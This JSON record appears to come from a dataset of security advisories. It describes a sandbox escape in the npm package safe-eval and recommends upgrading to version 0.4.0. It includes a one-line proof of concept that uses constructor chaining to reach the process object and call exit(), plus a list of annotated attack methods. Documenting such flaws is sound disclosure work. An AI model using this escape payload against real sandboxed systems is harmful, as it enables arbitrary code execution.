{"description": "Affected versions of `safe-eval` are vulnerable to a sandbox escape. By accessing object constructors, un-sanitized user input can access the entire standard library and effectively break out of the sandbox. \n\n## Proof of Concept:\nThis code accesses the process object and calls `.exit()`\n```js\nvar safeEval = require('safe-eval');\nsafeEval(\"this.constructor.constructor('return process')().exit()\");\n```\n\n\n## Recommendation\n\nUpdate to version 0.4.0 or later", "methods": ["Used a sandbox escape technique to break out of the sandbox.", "Executed a command to exit the process.", "Accessed the process object.", "Accessed the standard library."]}
